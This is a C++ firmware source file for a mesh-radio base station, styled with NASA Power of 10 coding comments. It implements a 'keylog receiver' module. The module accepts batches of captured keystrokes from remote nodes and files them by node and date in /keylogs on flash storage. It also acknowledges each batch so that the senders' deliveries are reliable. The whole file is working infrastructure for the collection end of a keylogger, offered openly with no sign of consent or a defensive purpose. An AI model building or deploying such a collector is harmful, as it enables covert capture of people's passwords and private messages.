/**
 * @file KeylogReceiverModule.cpp
 * @brief Keylog receiver module implementation for Heltec V4 base station
 *
 * NASA Power of 10 Compliance:
 *  - Rule 1: Simple control flow (no goto, setjmp, recursion)
 *  - Rule 2: All loops have fixed upper bounds
 *  - Rule 3: No dynamic memory after init
 *  - Rule 4: Assertions verify all assumptions
 *  - Rule 5: Data declared at smallest scope
 *  - Rule 6: All return values checked
 *  - Rule 7: Limited pointer dereferencing
 *  - Rule 8: Preprocessor used sparingly
 *  - Rule 9: Limited function pointer use
 *  - Rule 10: Compile with all warnings enabled
 *
 * SPDX-License-Identifier: GPL-3.0-only
 */

#include "configuration.h"

#ifdef KEYLOG_RECEIVER_ENABLED

#include "KeylogReceiverModule.h"
#include "MeshService.h"
#include "Router.h"
#include "FSCommon.h"
#include "gps/RTC.h"
#include <cassert>

// Module instance
KeylogReceiverModule *keylogReceiverModule = nullptr;

// Base directory for keylog storage
static const char *KEYLOG_BASE_DIR = "/keylogs";

KeylogReceiverModule::KeylogReceiverModule()
    : SinglePortModule("keylog", meshtastic_PortNum_PRIVATE_APP),
      totalBatchesReceived(0),
      totalBatchesStored(0),
      totalAcksSent(0),
      storageErrors(0),
      lastStatsLog(0)
{
    // NASA Rule 4: Assert invariants at construction
    assert(KEYLOG_MAX_PATH_LEN >= 64);
    assert(KEYLOG_ACK_BUFFER_SIZE >= 16);
}

bool KeylogReceiverModule::init()
{
    LOG_INFO("[KeylogReceiver] Initializing keylog receiver module");

    // Create base directory if it doesn't exist
    if (!FSCom.exists(KEYLOG_BASE_DIR)) {
        if (!FSCom.mkdir(KEYLOG_BASE_DIR)) {
            LOG_ERROR("[KeylogReceiver] Failed to create %s directory", KEYLOG_BASE_DIR);
            return false;
        }
        LOG_INFO("[KeylogReceiver] Created %s directory", KEYLOG_BASE_DIR);
    }

    LOG_INFO("[KeylogReceiver] Module initialized successfully");
    return true;
}

ProcessMessage KeylogReceiverModule::handleReceived(const meshtastic_MeshPacket &mp)
{
    // NASA Rule 4: Validate all inputs with assertions
    assert(mp.decoded.payload.size <= KEYLOG_MAX_PAYLOAD_SIZE);

    // Only process PRIVATE_APP packets
    if (mp.decoded.portnum != meshtastic_PortNum_PRIVATE_APP) {
        return ProcessMessage::CONTINUE;
    }

    const uint8_t *payload = mp.decoded.payload.bytes;
    const size_t payloadLen = mp.decoded.payload.size;

    // NASA Rule 6: Check bounds before processing
    if (payloadLen < KEYLOG_BATCH_HEADER_SIZE) {
        LOG_WARN("[KeylogReceiver] Payload too small: %u bytes", payloadLen);
        return ProcessMessage::CONTINUE;
    }

    // Check if this is an ACK response (starts with "ACK:")
    // ACK responses are for the sender, not for us to process
    if (payloadLen >= 4 && payload[0] == 'A' && payload[1] == 'C' &&
        payload[2] == 'K' && payload[3] == ':') {
        // This is an ACK, not a batch - let it pass through
        return ProcessMessage::CONTINUE;
    }

    totalBatchesReceived++;

    // Extract batch_id (first 4 bytes, little-endian)
    // NASA Rule 7: Minimize pointer operations
    uint32_t batchId = 0;
    batchId |= ((uint32_t)payload[0]);
    batchId |= ((uint32_t)payload[1]) << 8;
    batchId |= ((uint32_t)payload[2]) << 16;
    batchId |= ((uint32_t)payload[3]) << 24;

    // Get keystroke data (after batch_id header)
    const uint8_t *keystrokeData = payload + KEYLOG_BATCH_HEADER_SIZE;
    const size_t keystrokeLen = payloadLen - KEYLOG_BATCH_HEADER_SIZE;

    LOG_INFO("[KeylogReceiver] Received batch 0x%08lX from !%08x (%u bytes)",
             (unsigned long)batchId, mp.from, keystrokeLen);

    // Store to flash
    bool stored = storeKeystrokeBatch(mp.from, batchId, keystrokeData, keystrokeLen);

    if (stored) {
        totalBatchesStored++;

        // Send ACK back to sender
        if (sendAck(mp.from, batchId)) {
            totalAcksSent++;
            LOG_INFO("[KeylogReceiver] ACK sent for batch 0x%08lX", (unsigned long)batchId);
        } else {
            LOG_ERROR("[KeylogReceiver] Failed to send ACK for batch 0x%08lX", (unsigned long)batchId);
        }
    } else {
        storageErrors++;
        LOG_ERROR("[KeylogReceiver] Failed to store batch 0x%08lX", (unsigned long)batchId);
    }

    // Log stats periodically
    uint32_t now = millis();
    if (now - lastStatsLog >= KEYLOG_STATS_LOG_INTERVAL_MS) {
        lastStatsLog = now;
        LOG_INFO("[KeylogReceiver] Stats: rx=%lu stored=%lu acks=%lu errors=%lu",
                 (unsigned long)totalBatchesReceived,
                 (unsigned long)totalBatchesStored,
                 (unsigned long)totalAcksSent,
                 (unsigned long)storageErrors);
    }

    return ProcessMessage::STOP;
}

bool KeylogReceiverModule::storeKeystrokeBatch(NodeNum from, uint32_t batchId,
                                                const uint8_t *data, size_t len)
{
    // NASA Rule 4: Validate inputs
    assert(data != nullptr || len == 0);
    assert(len <= KEYLOG_MAX_PAYLOAD_SIZE);

    // Ensure node directory exists
    if (!ensureNodeDirectory(from)) {
        LOG_ERROR("[KeylogReceiver] Failed to create directory for node !%08x", from);
        return false;
    }

    // Get log file path
    char pathBuf[KEYLOG_MAX_PATH_LEN];
    if (!getLogFilePath(from, pathBuf)) {
        LOG_ERROR("[KeylogReceiver] Failed to generate path for node !%08x", from);
        return false;
    }

    // Open file in append mode
    // NASA Rule 6: Check return value
    File file = FSCom.open(pathBuf, "a");
    if (!file) {
        LOG_ERROR("[KeylogReceiver] Failed to open %s for writing", pathBuf);
        return false;
    }

    // Write batch header with timestamp
    uint32_t timestamp = getValidTime(RTCQualityFromNet);
    int headerLen = file.printf("\n--- Batch 0x%08lX at %lu ---\n",
                                 (unsigned long)batchId, (unsigned long)timestamp);
    if (headerLen <= 0) {
        LOG_ERROR("[KeylogReceiver] Failed to write batch header");
        file.close();
        return false;
    }

    // Write keystroke data
    // NASA Rule 2: Fixed upper bound on write
    size_t written = 0;
    if (len > 0) {
        written = file.write(data, len);
    }

    // Add newline after data
    file.println();

    // Flush and close
    file.flush();
    file.close();

    if (written != len) {
        LOG_ERROR("[KeylogReceiver] Partial write: %u of %u bytes", written, len);
        return false;
    }

    LOG_DEBUG("[KeylogReceiver] Stored %u bytes to %s", len, pathBuf);
    return true;
}

bool KeylogReceiverModule::ensureNodeDirectory(NodeNum nodeId)
{
    // Build directory path: /keylogs/<node_hex>/
    char dirPath[KEYLOG_MAX_PATH_LEN];

    // NASA Rule 6: Check snprintf return
    int pathLen = snprintf(dirPath, sizeof(dirPath), "%s/%08x", KEYLOG_BASE_DIR, nodeId);
    if (pathLen < 0 || pathLen >= (int)sizeof(dirPath)) {
        LOG_ERROR("[KeylogReceiver] Directory path overflow");
        return false;
    }

    // Check if exists
    if (FSCom.exists(dirPath)) {
        return true;
    }

    // Create directory
    if (!FSCom.mkdir(dirPath)) {
        LOG_ERROR("[KeylogReceiver] Failed to create directory %s", dirPath);
        return false;
    }

    LOG_INFO("[KeylogReceiver] Created directory %s", dirPath);
    return true;
}

bool KeylogReceiverModule::getLogFilePath(NodeNum nodeId, char *pathBuf)
{
    // NASA Rule 4: Validate output buffer
    assert(pathBuf != nullptr);

    // Get current date for filename
    uint32_t timestamp = getValidTime(RTCQualityFromNet);

    // Convert to date components
    // Using simple day calculation (days since epoch)
    // For proper date formatting, we'd need time.h but this is simpler
    uint32_t days = timestamp / 86400;
    uint32_t year = 1970;
    uint32_t month = 1;
    uint32_t day = 1;

    // NASA Rule 2: Fixed upper bound on loop iterations
    // Calculate year (max 200 iterations covers 1970-2170)
    for (uint32_t i = 0; i < 200 && days >= 365; i++) {
        bool leap = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
        uint32_t daysInYear = leap ? 366 : 365;
        if (days >= daysInYear) {
            days -= daysInYear;
            year++;
        } else {
            break;
        }
    }

    // Days in each month (non-leap year default)
    static const uint8_t daysInMonth[12] = {31, 28, 31, 30, 31, 30, 31, 31, 30, 31, 30, 31};

    // Calculate month (max 12 iterations)
    for (uint32_t m = 0; m < 12 && days >= daysInMonth[m]; m++) {
        uint32_t dim = daysInMonth[m];
        // Adjust February for leap year
        if (m == 1) {
            bool leap = ((year % 4 == 0) && (year % 100 != 0)) || (year % 400 == 0);
            if (leap) {
                dim = 29;
            }
        }
        if (days >= dim) {
            days -= dim;
            month++;
        } else {
            break;
        }
    }
    day = days + 1;

    // Build path: /keylogs/<node_hex>/keylog_YYYY-MM-DD.txt
    int pathLen = snprintf(pathBuf, KEYLOG_MAX_PATH_LEN,
                           "%s/%08x/keylog_%04lu-%02lu-%02lu.txt",
                           KEYLOG_BASE_DIR, nodeId,
                           (unsigned long)year, (unsigned long)month, (unsigned long)day);

    // NASA Rule 6: Check for truncation
    if (pathLen < 0 || pathLen >= KEYLOG_MAX_PATH_LEN) {
        LOG_ERROR("[KeylogReceiver] Path truncated");
        return false;
    }

    return true;
}

bool KeylogReceiverModule::sendAck(NodeNum to, uint32_t batchId)
{
    // NASA Rule 4: Validate destination
    if (to == 0 || to == NODENUM_BROADCAST) {
        LOG_ERROR("[KeylogReceiver] Invalid ACK destination: %08x", to);
        return false;
    }

    // Build ACK string: "ACK:0x12345678"
    char ackBuf[KEYLOG_ACK_BUFFER_SIZE];
    int ackLen = snprintf(ackBuf, sizeof(ackBuf), "ACK:0x%08lX", (unsigned long)batchId);

    // NASA Rule 6: Check for truncation
    if (ackLen < 0 || ackLen >= (int)sizeof(ackBuf)) {
        LOG_ERROR("[KeylogReceiver] ACK buffer overflow");
        return false;
    }

    // Allocate packet
    meshtastic_MeshPacket *reply = allocDataPacket();
    if (reply == nullptr) {
        LOG_ERROR("[KeylogReceiver] Failed to allocate ACK packet");
        return false;
    }

    // Configure packet
    reply->to = to;
    reply->decoded.portnum = meshtastic_PortNum_PRIVATE_APP;
    reply->want_ack = false;  // ACK doesn't need ACK
    reply->priority = meshtastic_MeshPacket_Priority_HIGH;

    // Copy ACK payload
    // NASA Rule 4: Assert bounds
    assert((size_t)ackLen < sizeof(reply->decoded.payload.bytes));
    memcpy(reply->decoded.payload.bytes, ackBuf, ackLen + 1);
    reply->decoded.payload.size = ackLen;

    // Send packet
    service->sendToMesh(reply, RX_SRC_LOCAL, true);

    LOG_DEBUG("[KeylogReceiver] Sent ACK to !%08x: %s", to, ackBuf);
    return true;
}

#endif /* KEYLOG_RECEIVER_ENABLED */
